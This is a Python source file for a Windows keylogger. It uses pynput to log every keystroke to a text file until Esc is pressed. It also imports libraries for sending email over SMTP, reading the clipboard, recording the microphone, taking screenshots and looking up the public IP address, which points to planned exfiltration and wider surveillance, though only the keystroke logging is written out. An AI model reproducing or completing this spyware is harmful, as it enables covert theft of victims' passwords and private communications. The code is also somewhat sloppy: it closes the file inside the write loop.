# Libraries
# For out Email Features
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

# For Clipboard Information
import win32clipboard

# For key Strokes
from pynput.keyboard import Key, Listener

import time
import os

# For microphone Functions
from scipy.io.wavfile import write
import sounddevice as sd

# For encryption of source code
from cryptography.fernet import Fernet

# #####################
import getpass
from requests import get

# For screenShot functionality
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

logFileName = "key_log.txt"
filePath = "A:\\Code and Dev\\Python\\KeyLogger"
extend = "\\"

count = 0
keys = []


def onPress(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []


def writeFile(keys):
    with open(filePath + extend + logFileName, "a") as f:
        for key in keys:
            temp = str(key).replace("'", "")
            if temp.find("space") > 0:
                f.write('\n')
                f.close()
            elif temp.find("Key") == -1:
                f.write(temp)
                f.close()


def onRelease(key):
    if key == Key.esc:
        return False


with Listener(on_press=onPress, on_release=onRelease) as listner:
    listner.join()





